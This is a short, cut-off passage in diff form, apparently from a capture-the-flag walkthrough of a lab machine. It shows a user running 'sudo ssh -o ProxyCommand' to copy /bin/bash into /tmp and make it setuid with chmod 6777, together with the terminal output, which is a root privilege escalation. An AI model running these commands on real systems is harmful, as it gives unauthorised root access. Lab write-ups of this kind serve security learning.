@@ -1,0 +1,1 @@
+sh -o ProxyCommand = 'cp /bin/bash /tmp/0xdf' localhost kex_exchange_identification: Connection closed by remote host Connection closed by UNKNOWN port 65535 josh@cozyhosting:~$ sudo ssh -o ProxyCommand = 'chmod 6777 /tmp/0xdf' localhost kex_exchange_identification: Connection closed by remote host Connection closed
